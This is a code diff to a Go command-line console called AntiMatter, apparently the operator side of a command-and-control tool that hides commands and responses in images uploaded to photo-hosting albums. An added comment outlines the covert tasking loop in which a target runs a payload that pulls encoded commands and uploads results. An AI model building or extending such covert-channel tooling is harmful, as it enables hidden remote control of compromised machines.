@@ -2,10 +2,30 @@
 // Error handling []
 // Display walkthroughs for each module []
 // Set up mysql and configure it for multiple agent handlings []
-// Error handling for existing tables and what not []
+// Error handling for existing tables and what not [√]
 // Fix some of the verbiage on the modules so that it makes a bit more sense []
 // Maybe some autocomplete and up arrow stuff []
+// Add the ability to upload to other albums []
 // Change all the options so that when you type "options" and the value exists, it queries the database and not the global maps []
+
+/*
+ My thought right now is that this will look for any descriptions that mention the word "response"
+ For right now, and then maybe get a big dict of words that will mean specific things
+
+ Beta build:
+
+ 1. Create an image with an encoded command in it
+ 2. Create an album for this to go in, with a particular title (That will be created within the payload so that when the agent executes the payload, it will know what album to look for)
+ 3. Add "tasking image" to this album (or any other /shrug)
+ 4. <Target runs payload, grabs image and decodes/runs payload, uploads new image with response to the same album>
+ 5. C2 Server will pull any album it has marked as "ACTIVE", and see if there are any new images
+ 6. Either alert the operator or have to operator do a manual check, and show that there is a new image with a reponse in it
+ 7. Either auto-show the response to the operator or have the operator use the Reponse module to check the response for a particular target
+
+
+
+
+*/
 
 package main
 
@@ -40,7 +60,7 @@ func validateOptions(slice []string, val string) bool {
 }
 
 // Global map for the Image module
-var imageOptions = map[string]string{"Command": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": ""}
+var imageOptions = map[string]string{"Command": "", "BaseImage": "", "NewFilename": "", "ClientID": ""}
 
 // Global map for the Album module
 var albumOptions = map[string]string{"Title": "", "Client-ID": "", "AlbumID": "", "Album Delete-Hash": ""}
@@ -188,7 +208,7 @@ func main() {
 			for {
 				reader := bufio.NewReader(os.Stdin)
 				color.Set(color.FgGreen)
-				fmt.Print("AntiMatter/Album > ")
+				fmt.Print("AntiMatter/Album >> ")
 				color.Unset()
 				// Had to do this since case sensitivity is dumb in golang
 				initialText, _ := reader.ReadString('\n')
@@ -234,7 +254,7 @@ func main() {
 					}
 
 				} else if strings.Contains(text, "list") {
-					fmt.Println(color.CyanString("AlbumHash:"), albumOptions["Album Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"])
+					fmt.Println(color.CyanString("AlbumHash:"), albumOptions["Album Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"], "|", color.CyanString("Title:"), albumOptions["Title"])
 
 				} else if strings.Contains(text, "go") {
 					albumID, deletehash := cmd.CreateAlbum(albumOptions["Title"], albumOptions["Client-ID"])
@@ -254,7 +274,7 @@ func main() {
 			for {
 				reader := bufio.NewReader(os.Stdin)
 				color.Set(color.FgGreen)
-				fmt.Print("AntiMatter/Task > ")
+				fmt.Print("AntiMatter/Task >> ")
 				color.Unset()
 				// Had to do this since case sensitivity is dumb in golang
 				initialText, _ := reader.ReadString('\n')
@@ -351,9 +371,9 @@ func main() {
 					// Check the lengths to appropriately label values
 					for _, items := range tmp {
 						if len(items) == 15 {
-							fmt.Println(color.GreenString("[+] Image Delete Hash is:"), items)
+							fmt.Println(color.GreenString("[+]"), "Image Delete Hash is:", items)
 						} else if len(items) == 7 {
-							fmt.Println(color.GreenString("[+] Image ID is:"), items)
+							fmt.Println(color.GreenString("[+]"), "Image ID is:", items)
 						}
 					}
 
@@ -362,25 +382,12 @@ func main() {
 			}
 
 		}
-		/*
-		 My thought right now is that this will look for any descriptions that mention the word "response"
-		 For right now, and then maybe get a big dict of words that will mean specific things
 
-		 Beta build:
-		 1. Search albumOptions["AlbumID"] using API for images
-		 2. Search through their descriptions to see if any say "response" in them
-		 3. If they do, pull the link from the data and grab that image and decode it
-		 4. Store the decoded info into resonseOptions["Response-Data"]
-		 5. Give to user
-
-
-
-		*/
 		if strings.EqualFold(result, "Response") {
 			for {
 				reader := bufio.NewReader(os.Stdin)
 				color.Set(color.FgGreen)
-				fmt.Print("AntiMatter/Response > ")
+				fmt.Print("AntiMatter/Response >> ")
 				color.Unset()
 				// Had to do this since case sensitivity is dumb in golang
 				initialText, _ := reader.ReadString('\n')
@@ -455,7 +462,22 @@ func main() {
 			fmt.Println("This will walk you through the options that you need to get this started")
 
 		}
-		if strings.EqualFold(result, "") {
+		if strings.EqualFold(result, "Delete") {
+			for {
+				reader := bufio.NewReader(os.Stdin)
+				color.Set(color.FgGreen)
+				fmt.Print("AntiMatter/Response >> ")
+				color.Unset()
+				// Had to do this since case sensitivity is dumb in golang
+				initialText, _ := reader.ReadString('\n')
+				text := strings.ToLower(initialText)
+
+				if strings.Contains(text, "list") {
+					fmt.Println("\n---IMAGES---")
+					fmt.Println(" ")
+
+				}
+			}
 		}
 	}
 }
